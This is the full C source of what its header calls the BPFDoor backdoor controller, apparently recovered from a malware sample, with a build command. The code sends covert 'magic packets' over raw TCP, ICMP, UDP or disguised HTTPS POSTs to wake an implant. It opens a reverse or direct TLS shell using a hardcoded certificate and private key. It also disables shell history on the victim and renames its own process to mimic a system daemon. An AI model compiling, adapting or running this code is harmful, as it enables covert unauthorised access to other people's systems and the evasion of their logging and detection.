/* BPFDoor controller source, recovered from:
    2eacc8d91b9829b9606a7945fc5311fb5876cfb42ffccc1b91f61841237b04c1 

   gcc -Wno-implicit-function-declaration bpfdoor_controller.c -lssl -lcrypto -o controller
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <netinet/ip_icmp.h>
#include <sys/prctl.h>
#include <sys/poll.h>
#include <linux/tcp.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <sys/time.h>
#include <openssl/crypto.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#define MAXSIZE 65535
#define DATASIZE        1024

#define ECHAR   0x0b

#ifndef __CYGWIN__
#define TIOCGWINSZ      0x5413
#define TIOCSWINSZ      0x5414
#endif

#define BUF             16384
#define BUF_SIZE        4096
#define ENVLEN  256

#define UDPLEN  sizeof(struct udphdr)
#define PSELEN  sizeof(struct psehdr)
#define MAGICLEN        sizeof(struct magic_packet)

#ifndef PR_SET_NAME
        #define PR_SET_NAME 15
#endif
extern char **environ;
struct udphdr {
        uint16_t uh_sport;         /* source port */
        uint16_t uh_dport;         /* destination port */
        uint16_t uh_ulen;          /* udp length */
        uint16_t uh_sum;           /* udp checksum */
} __attribute__ ((packed));
struct psehdr
{
        in_addr_t       saddr;
        in_addr_t       daddr;
        unsigned char   reserved;
        unsigned char   proto;
        unsigned short  len;
} __attribute__ ((packed));
struct magic_packet{
unsigned int    flag;
in_addr_t       ip;
unsigned short  port;
char            pass[14];
in_addr_t       hip;
} __attribute__ ((packed));

#ifndef uchar
#define uchar unsigned char
#endif

#ifndef ushort
#define ushort unsigned short
#endif

#ifndef ulong
#define ulong unsigned long
#endif

#ifndef uint
#define uint ulong
#endif
typedef struct {          
        uchar   state[256];
        uchar   x, y;
} rc4_ctx;
char *envtab[] =
{
        "",
        "",
        "export TERM=vt100\n",
        "export MYSQL_HISTFILE=/dev/null\n",
        "export HISTFILE=/dev/null\n",
        "export PATH=/bin:/usr/kerberos/sbin:/usr/kerberos/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin:./bin\n",
        "unset PROMPT_COMMAND\n",
        "export HISTSIZE=100\n",
        NULL
};
int winsize, raw = 0, nopass = 0, debug = 0;
int magic_flag = 0x9352;
int tmout = 60000;
void getshell(int);
void winch();
void shell(int,int);
int spawn_shell(char *, int, int);
char *getpassw(char *);
struct magic_packet packet;
int direct = 0;
static in_addr_t resolve(char *s, char *p)
{
        struct  hostent *he;
        struct  sockaddr_in si;

        memset(&si, 0, sizeof(si));
        si.sin_addr.s_addr = inet_addr(s);
        if (si.sin_addr.s_addr == INADDR_NONE) {
                he = gethostbyname(s);
                if (!he) {
                        return INADDR_NONE;
                }
                memcpy((char *) &si.sin_addr, (char *) he->h_addr,
                           sizeof(si.sin_addr));
        }
        strcpy(p, inet_ntoa(si.sin_addr));
        return si.sin_addr.s_addr;
}
int listen_port(int port)
{
        struct sockaddr_in my_addr,remote_addr;
        int sock_fd,sock_id;
        int flag = 1, interval = 60, val;
        socklen_t size;

        if( (sock_fd = socket(AF_INET,SOCK_STREAM,0)) == -1 ){
                perror("[-] socket");
                return -1;
        }

        my_addr.sin_family = AF_INET;
        my_addr.sin_port = port;
        my_addr.sin_addr.s_addr = 0;

        setsockopt(sock_fd,SOL_SOCKET,SO_REUSEADDR, (char*)&flag,sizeof(flag));

    setsockopt(sock_fd,SOL_SOCKET,SO_KEEPALIVE, (char*)&flag,sizeof(flag));

    setsockopt(sock_fd,IPPROTO_TCP,TCP_KEEPIDLE, &interval, sizeof(interval));

    val = 20;

    setsockopt(sock_fd,IPPROTO_TCP, TCP_KEEPINTVL, &val, sizeof(val));

    val = 3;

    setsockopt(sock_fd, IPPROTO_TCP, TCP_KEEPCNT, &val, sizeof(val));

        if( bind(sock_fd,(struct sockaddr *)&my_addr,sizeof(struct sockaddr)) == -1 ){
                perror("[-] bind");
                return -1;
        }

        if( listen(sock_fd,1) == -1 ){
                perror("[-] listen");
                return -1;
        }

        size = sizeof(struct sockaddr_in);
        if( (sock_id = accept(sock_fd,(struct sockaddr *)&remote_addr, &size)) == -1 ){
                perror("[-] accept");
                return -1;
        }

        close(sock_fd);
        return sock_id;
}
void  usage(char *pro)
{
        fprintf(stdout, "\n");
        exit(0);
}
unsigned short csum(unsigned short *ptr,int nbytes) {
long sum;
unsigned short oddbyte;
short answer;

sum=0;
while(nbytes>1) {

sum+=*ptr++;

nbytes-=2;

}
if(nbytes==1) {

oddbyte=0;


*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;

sum+=oddbyte;

}

sum = (sum>>16)+(sum & 0xffff);
sum = sum + (sum>>16);
answer=(short)~sum;

return(answer);
}

int icmpcmd(char *dip, int dport, in_addr_t cip, unsigned short cport,char *hdip)
{
        struct sockaddr_in remote;
        char data_buf[MAXSIZE];
        int      sock;
        int      len, datalen, s_len;
        struct icmphdr *icmp;

        if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
                perror("[-] socket");
                return -1;
        }

        packet.flag = 0x5572;
        packet.ip       = cip;
        packet.port = cport;
char buf[64] = {0};
packet.hip = resolve(hdip, buf);

        datalen = sizeof(struct magic_packet);

        memset(data_buf, 0, sizeof(data_buf));

        icmp = (struct icmphdr *) data_buf;
        icmp->type = 8; 
        icmp->code = 0;
        icmp->checksum = 0;
        icmp->un.echo.sequence = 1234;
        icmp->un.echo.id = getpid();
        memcpy(data_buf + 8, &packet, datalen);


        icmp->checksum = csum((unsigned short *)icmp, 8+datalen);

        len = sizeof(struct icmphdr) + datalen;

        remote.sin_family = AF_INET;
        remote.sin_port   = htons(dport);
        remote.sin_addr.s_addr = inet_addr(dip);
        s_len = sendto(sock, data_buf, len, 0, (struct sockaddr *)&remote, sizeof(struct sockaddr));
        if (s_len < 0) {
                perror("[-] sendto");
                close(sock);
                return -1;
        }
        printf("[+] Packet Successfuly Sending %d Size.\n",s_len);

        close(sock);
        return 0;
}
int udpcmd(char *dip, int dport, in_addr_t cip, unsigned short cport,char *hdip)
{
        struct sockaddr_in remote;
        int      sock;
        int      s_len;

        if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < -1) {
                perror("[-] socket");
                return -1;
        }

packet.flag = 0x5572;
packet.ip       = cip;
packet.port = cport;
char buf[64] = {0};
packet.hip = resolve(hdip, buf);

        remote.sin_family = AF_INET;
        remote.sin_port   = htons(dport);
        remote.sin_addr.s_addr = inet_addr(dip);

        if ((s_len = sendto(sock, (char *)&packet, MAGICLEN, 0, (struct sockaddr *)&remote, sizeof(struct sockaddr))) < 0) {
                perror("[-] sendto");
                close(sock);
                return -1;
        }

        printf("[+] Packet Successfuly Sending %d Size.\n",s_len);

        close(sock);
        return 0;
}
int sendcmd(char *dip, int dport, in_addr_t cip, unsigned short cport,char *hdip)
{
        struct iphdr *ip;
        struct tcphdr *tcp;
        struct psehdr pse;
        struct sockaddr_in remote;
        char data_buf[MAXSIZE];
        char *pseudo_packet;
        int      sock;
        int      flag=1;
        int      s_len;

        if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < -1) {
                perror("[-] socket");
                return -1;
        }

        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) < 0 ) {
                perror("[-] setsockopt");
                close(sock);
                return -1;
        }


packet.flag = 0x9352;

packet.ip       = cip;

packet.port = cport;

char buf[64] = {0};

packet.hip = resolve(hdip, buf);

        memset(data_buf, 0, sizeof(data_buf));
        ip = (struct iphdr *) data_buf;
        tcp =(struct tcphdr *) (data_buf + sizeof(struct iphdr));
        memcpy(data_buf + sizeof(struct iphdr) + sizeof(struct tcphdr), &packet, MAGICLEN);

        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + MAGICLEN;
        ip->id = htons(54321);
        ip->frag_off = 0x00;
        ip->ttl = 0xFF;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = cip; 
        ip->daddr = inet_addr(dip);
        ip->check = csum((unsigned short *) data_buf, ip->tot_len); 

        tcp->source = htons(39812);
        tcp->dest = htons(dport);
        tcp->seq = 0x0;
        tcp->ack_seq = 0x0;
        tcp->doff = 5;
        tcp->res1 = 0;
        tcp->cwr = 0;
        tcp->ece = 0;
        tcp->urg = 0;
        tcp->ack = 0;
        tcp->psh = 0;
        tcp->rst = 0;
        tcp->syn = 1;
        tcp->fin = 0;
        tcp->window = htons(155); 
        tcp->check = 0;
        tcp->urg_ptr = 0;

        pse.saddr = cip;
        pse.daddr = inet_addr(dip);
        pse.reserved = 0;
        pse.proto = IPPROTO_TCP;
        pse.len = htons(sizeof(struct tcphdr) + MAGICLEN);

        pseudo_packet = (char *) malloc((int) (sizeof(struct psehdr) + sizeof(struct tcphdr) + MAGICLEN));
        memset(pseudo_packet, 0, sizeof(struct psehdr) + sizeof(struct tcphdr) + MAGICLEN);
        memcpy(pseudo_packet, (char *) &pse, sizeof(struct psehdr));
        tcp->seq = htonl(1138083241);
        tcp->check = 0;
        memcpy(pseudo_packet + sizeof(struct psehdr), tcp, sizeof(struct tcphdr) + MAGICLEN);
        tcp->check = (csum((unsigned short *) pseudo_packet, (int) (sizeof(struct psehdr) + sizeof(struct tcphdr) + MAGICLEN)));

        remote.sin_family = AF_INET;
        remote.sin_port   = tcp->dest;
        remote.sin_addr.s_addr = ip->daddr;

        if ((s_len = sendto(sock, data_buf, ip->tot_len, 0, (struct sockaddr *)&remote, sizeof(struct sockaddr))) < 0) {
                perror("[-] sendto");
                close(sock);
                return -1;
        }

        printf("[+] Packet Successfuly Sending %d Size.\n",s_len);
        close(sock);

        if (direct == 1)
                spawn_shell(dip, dport, direct);
        return 0;
}
static int gotlink(int sock, char *host, ushort port, in_addr_t cip, unsigned short cport,char *hdip)
{
        struct  sockaddr_in loc;
        socklen_t i;
        size_t size;
        in_addr_t ip;

        printf("[+] Using port %d\n", port);

        i = sizeof(loc);
        if (getsockname(sock, (struct sockaddr *) &loc, &i) < 0) {
                perror("getsockname");
                close(sock);
                return 1;
        }

        ip = cip;
        if (ip == INADDR_NONE)
                ip = loc.sin_addr.s_addr;

        printf("[+] Challenging %s.\n", host);


        packet.ip = ip;
        packet.port = cport;
char buf[64] = {0};
packet.hip = resolve(hdip, buf);

        size = write(sock, (void *)&packet, sizeof(packet));
        if (size != sizeof(packet)) {
                printf("[-] Can't write auth challenge\n");
        }
        close(sock);
        return 0;
}
int do_conn(char *dip, int dport)
{
        struct sockaddr_in remote;
        int sock;
        in_addr_t ip;
        char buf[64] = {0};

        if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < -1) {
                perror("[-] socket");
                return -1;
        }

        ip = resolve(dip, buf);
        if (ip == INADDR_NONE) {
                printf("[-] FATAL: can't resolve %s\n", dip);
                return -1;
        }

        remote.sin_family = AF_INET;
        remote.sin_addr.s_addr = ip;
        remote.sin_port = htons(dport);

        if (connect(sock, (struct sockaddr *)&remote, sizeof(struct sockaddr_in)) == -1) {
                perror("[-] connect.");
                exit(0);
        }
        return sock;
}
int spawn_shell(char *dip, int dport, int direct)
{
        int sock;

        printf("[+] Wait 4s.\n");
        sleep(4);
        sock = do_conn(dip, dport);
        if (sock == -1)
        {
                printf("[-] Spawn shell failed.\n");
        } else {
                shell(sock,direct);
        }

        return -1;
}
void ByteToHexStr(const unsigned char* source, char* dest, int sourceLen)  
{  
    short i;  
    unsigned char highByte, lowByte;  
  
    for (i = 0; i < sourceLen; i++)  
    {  
        highByte = source[i] >> 4;  
        lowByte = source[i] & 0x0f ;  
  
        highByte += 0x30;  
  
        if (highByte > 0x39)  
                dest[i * 2] = highByte + 0x07;  
        else  
                dest[i * 2] = highByte;  
  
        lowByte += 0x30;  
        if (lowByte > 0x39)  
            dest[i * 2 + 1] = lowByte + 0x07;  
        else  
            dest[i * 2 + 1] = lowByte;  
    }  
    return ;  
}  
   void Hex2Str( const char *sSrc,  char *sDest, int nSrcLen )  
{  
    int  i;  
    char szTmp[3];  
  
    for( i = 0; i < nSrcLen; i++ )  
    {  
        sprintf( szTmp, "%02X", (unsigned char) sSrc[i] );  
        memcpy( &sDest[i * 2], szTmp, 2 );  
    }  
    return ;  
}  
  void HexStrToByte(const char* source, unsigned char* dest, int sourceLen)  
{  
    short i;  
    unsigned char highByte, lowByte;  
      
    for (i = 0; i < sourceLen; i += 2)  
    {  
        highByte = toupper(source[i]);  
        lowByte  = toupper(source[i + 1]);  
  
        if (highByte > 0x39)  
            highByte -= 0x37;  
        else  
            highByte -= 0x30;  
  
        if (lowByte > 0x39)  
            lowByte -= 0x37;  
        else  
            lowByte -= 0x30;  
  
        dest[i / 2] = (highByte << 4) | lowByte;  
    }  
    return ;  
} 
int dogetlogin(char *dip, int dport, in_addr_t cip, unsigned short cport,char *host,char *dir,char *hdip)
{
int sock;
int ret = -1;

sock = do_conn(dip, dport);
if (sock) {

printf("[+] Successfuly Connected!\n");

fcntl(sock, F_SETFL, fcntl(sock, F_GETFL) & (~O_NONBLOCK));




SSL *ssl;

SSL_CTX *ctx;

SSL_load_error_strings();

SSL_library_init();

ctx = SSL_CTX_new(SSLv23_client_method());

if ( ctx == NULL ){


printf("[+] init SSL CTX failed\n");


return ret;


}

ssl = SSL_new(ctx);

if ( ssl == NULL ){


printf("[+] new SSL with created CTX failed\n");


return ret;


}

ret = SSL_set_fd(ssl, sock);

if ( ret == 0 ){


printf("[+] add SSL to tcp socket failed\n");


return -1;


}


RAND_poll();


while ( RAND_status() == 0 ){



unsigned short rand_ret = rand() % 65536;



RAND_seed(&rand_ret, sizeof(rand_ret));



}

ret = SSL_connect(ssl);

if( ret != 1 ){


printf("[+] SSL connection failed\n");


return -1;



}




struct  sockaddr_in loc;

socklen_t i;

size_t size;

in_addr_t ip;


printf("[+] Using port %d\n", dport);


i = sizeof(loc);

if (getsockname(sock, (struct sockaddr *) &loc, &i) < 0) {


perror("getsockname");


close(sock);


return 1;


}


ip = cip;

if (ip == INADDR_NONE)


ip = loc.sin_addr.s_addr;


printf("[+] Challenging %s.\n", dip);

packet.ip = ip;
packet.port = cport;
char buf[64] = {0};
packet.hip = resolve(hdip, buf);
        
char url[100] = {0};
char *urls[] = {
                "/admin/login.aspx?id=99990",
                "/admin_login.aspx?id=99990",
                "/Admin/Default.aspx?=99990",
                "/UploadFile.aspx?id=099990",
                "/user/admin.php?id=0099991",
                "/uploadfiles.php?id=099991",
                "/uploadfilm.php?id=0099991",
                "/uploadphoto.php?id=099991",
                "/uploadPic.php?id=00099991",
                "/systems/login.php?i=99991"
        };
       srand((unsigned)time(NULL));
        strcpy(url, urls[rand()%10]);

char dd[21] = {0};

if(strlen(dir)>0){


    sprintf(dd, "/%s/",dir);


if(strlen(dd) >=1 && strlen(dd) <=21 ){



memcpy(url,dd,strlen(dd));



}else{



printf("dir too long\n");



exit(0);



}


}

char a[100] = {0};

    sprintf(a, "POST %s HTTP/1.1\r\nHost: ",url);

char hex[100]={0};

char *d = hex;

ByteToHexStr((char *)&packet,d,MAGICLEN);

char b[200] = {0};

sprintf(b, "\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.5389.90 Safari/537.36\r\nContent-Length: %d", strlen(d));

char *c = "\r\n\r\n";




int len = strlen(a)+strlen(b)+strlen(c)+strlen(host)+strlen(d)+1;

char *result = malloc(len);
        memset(result, 0, len);




strcpy(result, a);

strcat(result, host);

strcat(result, b);

strcat(result, c);

strcat(result, d);



//size = write(sock, result, len);

if(debug)

printf("%s\n",result);

    SSL_write(ssl, result, len);

if(debug){


char readbuf[1024];


int bytes = SSL_read(ssl, readbuf, sizeof(readbuf));


readbuf[bytes] = 0;


printf("Received: %s", readbuf);


}

close(sock);

} else

printf("[-] Connect failed.\n");

printf("[+] Auth send ok.\n");

    if (direct == 1)
        spawn_shell(dip, dport, direct);
return ret;
}
int do_login(char *dip, int dport, in_addr_t cip, unsigned short cport,char *hdip)
{
        int sock;
        int ret = -1;

        sock = do_conn(dip, dport);
        if (sock) {
                printf("[+] Successfuly Connected!\n");
                fcntl(sock, F_SETFL, fcntl(sock, F_GETFL) & (~O_NONBLOCK));

ret = gotlink(sock, dip, dport, cip, cport,hdip);
        } else
                printf("[-] Connect failed.\n");

        if (ret == 0) printf("[+] Auth send ok.\n");

        if (direct == 1)
                spawn_shell(dip, dport, direct);
        return ret;
}
void getshell(int port)
{
        int     sock;



        printf("[+] listen on port %d\n",ntohs(port));
        sock = listen_port(port);

        if( sock < 0 ){
                printf("[-] bind port failed.\n");
                close(sock);
                return;
        }
        shell(sock,0);
        close(sock);
}
void winch()
{
        signal(SIGWINCH, winch);
        winsize++;
}
void shell(int sock, int direct)
{
        struct termios    old, new;
        unsigned char     buf[BUF];
        struct  pollfd fds[2];
        struct winsize    ws;
        int ret = 0;




SSL *ssl;

const SSL_METHOD *method;
        SSL_CTX *ctx;




if(direct == 0){


X509 *cert = NULL;


RSA *rsa = NULL;


BIO *cbio, *kbio;

const char *cert_buffer = "-----BEGIN CERTIFICATE-----\nMIIB+zCCAWQCCQC8+4Paa4ufAjANBgkqhkiG9w0BAQUFADBCMQswCQYDVQQGEwJY\nWDEVMBMGA1UEBwwMRGVmYXVsdCBDaXR5MRwwGgYDVQQKDBNEZWZhdWx0IENvbXBh\nbnkgTHRkMB4XDTIyMDUyMzAyNTk0MloXDTMyMDUyMDAyNTk0MlowQjELMAkGA1UE\nBhMCWFgxFTATBgNVBAcMDERlZmF1bHQgQ2l0eTEcMBoGA1UECgwTRGVmYXVsdCBD\nb21wYW55IEx0ZDCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEA1j3JyRPJTiUg\nd/PndmK0atcgec+7xit+Wf5mihiY97u2hvSsAuxEKsdJCYZxI1pfDI/KtoSTr5l+\nqvTCI5yYrvZ8CopvfOXyiLfh7YTK7NxcL0HArZLtC9dmBqVCOtpMcO3j6h7TFsp0\nvaJm8OiPWvd2QZLWjcX1Mys9AMO+eq8CAwEAATANBgkqhkiG9w0BAQUFAAOBgQDW\nejEu/FR5hFLAE0saEgm86JqZP5SatDYPhI4XFnF+5+bM/91SJkaw46YMoi7MPL1E\nyHLgfx8qkJx5IaADRYCZGv0k8ngBnU2zxBJgOtvJBxzAp3SU75lI0Y1mtEo0nppu\n5P1JZn6EK+2wAIUFKhR1LEpZCqMroh02anzybHAgCA==\n-----END CERTIFICATE-----";

const char *key_buffer = "-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDWPcnJE8lOJSB38+d2YrRq1yB5z7vGK35Z/maKGJj3u7aG9KwC\n7EQqx0kJhnEjWl8Mj8q2hJOvmX6q9MIjnJiu9nwKim985fKIt+HthMrs3FwvQcCt\nku0L12YGpUI62kxw7ePqHtMWynS9ombw6I9a93ZBktaNxfUzKz0Aw756rwIDAQAB\nAoGANzXbH3d65CmLMX5ogsizB+mClAGluU8SE60Mzb/DA+ybADJjdalfc8rBlrPP\nyjWK0xjnO5v010buLq4+raC4c72YiEqTP6Np8MFUKCNwaTkTu4oZKdDhYePqK5CD\nNWIUl55iHovaS2C7XLd9sU0L0jUuB9ADKU0p2pkMKxQ4BPECQQDtKkuGwkAeLEIK\n+iPxILI0ogYOo9+qsncw7kxkyp3BURYn97eyDh/vmN0nwBcfKEpHczf8C806AgVN\ne/llO8mpAkEA50FwJY+08PrTWc/M+nEPHVZShboc/BUhFS3m3bPWUFqI8bPLvxQh\nRBp4xY4tT2VJsi0CbxQ3mzJBHj0jjotIlwJAU4o7cmuIRFiYpt83u98lhq6v7YZB\n6hHVNFIsbLCGYysZ39g9R6X8D9zLwg3C10HM8GAgj1Lk5pMBpSqPTd6CiQJBAI+R\nub0oBa6iGfqlHt3QuRB+mgb5r6r0tzA96hlz37bNLj3YYMLFDY4JXTdQ+GJVQLaE\naQFrLMaGIZVTYbLKWAsCQDDgDcFg4fEDUSqIVLW2FTlHkXC3jXluC4MrMid+zPlg\nfbIBiNNOIJ8VJmeiBALxO5JuoCS3QZ8gqHU5/VpazCM=\n-----END RSA PRIVATE KEY-----";







/*ssl*/


SSL_library_init();


SSL_load_error_strings();


OpenSSL_add_ssl_algorithms();










method = TLSv1_server_method();


ctx = SSL_CTX_new(method);


if (!ctx) {



perror("Unable to create SSL context");



ERR_print_errors_fp(stderr);



exit(EXIT_FAILURE);



}






cbio = BIO_new_mem_buf((void*)cert_buffer, -1);


cert = PEM_read_bio_X509(cbio, NULL, 0, NULL);


SSL_CTX_use_certificate(ctx, cert);



kbio = BIO_new_mem_buf((void*)key_buffer, -1);


rsa = PEM_read_bio_RSAPrivateKey(kbio, NULL, 0, NULL);


SSL_CTX_use_RSAPrivateKey(ctx, rsa);



if( !SSL_CTX_check_private_key(ctx) )



{



fprintf(stderr,"Private key does not match the public certificate\n");



ERR_print_errors_fp(stderr);



}






SSL_CTX_set_cipher_list(ctx, "RC4-MD5");



/*end ssl*/






printf("[+] Spawn shell ok.\n");





ssl = SSL_new(ctx);


SSL_set_fd(ssl, sock);


if (SSL_accept(ssl) <= 0) {



ERR_print_errors_fp(stderr);



}


}else{


SSL_library_init();


SSL_load_error_strings();


OpenSSL_add_ssl_algorithms();


method = TLSv1_client_method();


ctx = SSL_CTX_new(method);


if (!ctx) {



return;



}


SSL_CTX_set_cipher_list(ctx, "RC4-MD5");


ssl = SSL_new(ctx);


SSL_set_fd(ssl, sock);


if ( SSL_connect(ssl) <=0 )



{



return;



}


}

printf("[+] SSL_accept ok.\n");



        fflush(stdout);
#ifndef SOLARIS
        char envbuf[ENVLEN+1];
        char buf1[256] = {0};
        char buf2[256] = {0};
        int i = 0;

        ioctl(0, TIOCGWINSZ, &ws);

sprintf(buf1, "unset PROMPT_COMMAND\nexport COLUMNS=%d\n", ws.ws_col);
        sprintf(buf2, "export LINES=%d\n", ws.ws_row);
        envtab[0] = buf1; envtab[1] = buf2;

        while (envtab[i]) {
                memset(envbuf, 0, ENVLEN);
                if (envtab[i][0] == '!') {
                        char *env;
                        env = getenv(&envtab[i][1]);
                        if (!env) goto oops;
                        sprintf(envbuf, "export %s=%s\n", &envtab[i][1], env);
                } else {
                        strncpy(envbuf, envtab[i], strlen(envtab[i]));
                }



SSL_write(ssl, envbuf, strlen(envbuf));
oops:
                i++;
        }
#endif
        tcgetattr(0, &old);
        new = old;
        new.c_lflag &= ~(ICANON | ECHO | ISIG);
        new.c_iflag &= ~(IXON | IXOFF);
        tcsetattr(0, TCSAFLUSH, &new);

        winch(0);
        while (1) {
        int count = 0;

if( winsize ) {


if (ioctl(0, TIOCGWINSZ, &ws) == 0) {



buf[0] = ECHAR;



buf[1] = (ws.ws_col >> 8) & 0xFF;



buf[2] = ws.ws_col & 0xFF;



buf[3] = (ws.ws_row >> 8) & 0xFF;



buf[4] = ws.ws_row & 0xFF;



SSL_write(ssl, buf, 5);



}


winsize = 0;


}

                fds[0].fd = sock;
                fds[1].fd = 0;
                fds[0].events = fds[1].events = POLLIN | POLLERR | POLLHUP | POLLNVAL;
                fds[0].revents = fds[1].revents = 0;


ret = poll(fds, 2, -1);
                switch(ret) {


case -1:
                
continue;



break;


case 0:



SSL_write(ssl, "w\n", 2);



continue;



break;


}

                if ((fds[0].revents | fds[1].revents) & (POLLERR | POLLHUP | POLLNVAL)) {
                        printf("\nHangup.\n");
                        break;
                }

                if (fds[0].revents & POLLIN) {





count = SSL_read(ssl, buf, sizeof(buf));
                        if (count <= 0) {
                                if (errno) perror("\nread");
                                break;
                        }
                        write(0, buf, count);
                }

                if (fds[1].revents & POLLIN) {
                        count = read(0, buf, sizeof(buf));
                        if (count <= 0) {
                                if (errno) perror("\nread");
                                break;
                        }





SSL_write(ssl, buf, count);
                }
        }
        SSL_shutdown(ssl);
        close(sock);
        tcsetattr(0, TCSAFLUSH, &old);
        printf("\nConnection closed.\n");
}
char *getpassw(char *prompt)
{
        struct  termios old, new;
        static  char    p[256];
        int     len;

        tcgetattr(0, &old);
        new = old;
        new.c_lflag &= ~(ECHO);
        tcsetattr(0, TCSAFLUSH, &new);
        printf("%s", prompt); fflush(stdout);
        len = read(0, p, sizeof(p)-1);
        if (len > 0) p[len-1] = 0;
        putc('\n', stderr);
        tcsetattr(0, TCSAFLUSH, &old);
        return p;
}

#ifndef SOLARIS
int set_proc_name(int argc, char **argv, char *new)
{
        size_t size = 0;
        int i;
        char *praw = NULL;
        char *last = NULL;
        char *p = argv[0];

        for (i = 0; environ[i]; i++)
                size += strlen(environ[i]) + 1;

        praw = (char *) malloc(size);
        if (NULL == praw) 
                return -1;

        for (i = 0; environ[i]; i++)
        {
                memcpy(praw, environ[i], strlen(environ[i]) + 1);
                environ[i] = praw;
                praw += strlen(environ[i]) + 1;
        }

        last = argv[0];

        for (i = 0; i < argc; i++)
                last += strlen(argv[i]) + 1;
        for (i = 0; environ[i]; i++)
                last += strlen(environ[i]) + 1;

        memset(p, 0x00, last - p);
        strncpy(p, new, last - p);

        prctl(PR_SET_NAME, (unsigned long) new);
        return 0;
}
#endif
int main(int argc,char *argv[])
{
        int c, pid = 0;
        int dport = 0;
        unsigned short bport = 0, lport = 0;
        in_addr_t lhost = INADDR_NONE;
        char destip[16] = {0};
char hdestip[16] = {0};
        int self = 0;
        char hashpass[] = "";
        char *pass = NULL;
char gethost[100] = {0};
char dir[20] = {0};

        if (argc == 1)
                usage(argv[0]);
        opterr = 0;

while ((c = getopt(argc, argv, ":h:d:l:s:b:t:D:g:H:f:wiunomcv")) != EOF) {

switch(c)


{

case 'h':


strncpy(destip, optarg, sizeof(destip));


break;

case 'H':


strncpy(hdestip, optarg, sizeof(hdestip));
                        break;
                case 'd':
                        dport = atoi(optarg);
                        break;
                case 'b':
                        bport = htons((unsigned short)strtoul(optarg, NULL, 0));
                        break;
                case 'l':
                        lhost = inet_addr(optarg);
                        break;
                case 's':
                        lport = htons((unsigned short)strtoul(optarg, NULL, 0));
                        break;
                case 'w':
                        raw = 1;


break;

case 'v':


    debug = 1;
                        break;
                case 'i':
                        raw = 2;
                        break;
                case 'u':
                        raw = 3;
                        break;
                case 'n':
                        nopass = 1;
                        break;
                case 'o':
                        magic_flag = 0x5571;
                        break;
                case 'm':
                        self = 1;
                        break;
                case 't':
                        tmout = atoi(optarg);
                        break;
                case 'f':
                        magic_flag = strtoul(optarg, NULL, 0);
                        break;

case 'g':


raw = 4;


strncpy(gethost, optarg, sizeof(gethost));


break;

case 'D':


strncpy(dir, optarg, sizeof(dir));


break;
                case 'c':
                        break;
                case '?':
                default :
                        usage(argv[0]);
                        break;
                }
        }

        if (bport){
                getshell(bport);
                return 0;
        }
        if (strlen(destip) == 0) {
                printf("[-] option requires an argument -- h\n");
                usage(argv[0]);
        }
        if (!dport) {
                printf("[-] option requires an argument -- d\n");
                usage(argv[0]);
        }
#ifndef SOLARIS
        set_proc_name(argc, argv, "/usr/sbin/abrtd");
#endif

        if (nopass == 1) {
                strncpy(packet.pass, hashpass, strlen(hashpass));

packet.pass[strlen(hashpass)] = '\0';

}
        else {
                pass = getpassw("Password: ");
                if (*pass)
                        strcpy(packet.pass, pass);
        }

        switch(packet.pass[0]) {
                case 's':
                        if (raw == 2 || raw == 3) {
                                printf("[-] Mode error.\n");
                                return -1;
                        }
                        if (raw == 1)
                                if (lhost == INADDR_NONE) {
                                        printf("[-] missing -l \n");
                                        return -1;
                                }

                        printf("[+] Direct connection mode\n");
                        direct = 1;
                        break;
                case 'j':
                        printf("[+] Reserve connection mode\n");


if (lport == 0) {



printf("[-] missing -s\n");



return -1;



}
                        if (raw == 1)
                                if (lhost == INADDR_NONE) {
                                        printf("[-] missing -l\n");
                                        return -1;
                                }
                        break;

case 'm':
                        printf("[+] Monitor packet send.\n");
                        direct = 2;
                        break;

default:


printf("[+] possible windows ?\n");
        }

        packet.flag = magic_flag;

    signal(SIGCHLD, SIG_IGN);
        if (direct == 0)
                pid = fork();
        if (pid) {
                if ((lhost == INADDR_NONE) || (self == 1))
                        getshell(lport);
                waitpid(pid, NULL, 0);
        }
        else {
                switch(raw) {
                        case 1:
                                sendcmd(destip, dport, lhost, lport,hdestip);
                                break;
                        case 2:
                                icmpcmd(destip, dport, lhost, lport,hdestip);
                                break;
                        case 3:
                                udpcmd(destip, dport, lhost, lport,hdestip);
                                break;

case 4:


dogetlogin(destip, dport, lhost, lport,gethost,dir,hdestip);


break;
                        default:
                                do_login(destip, dport, lhost, lport,hdestip);
                                break;
                }

exit(0);
        }
        return 0;
}
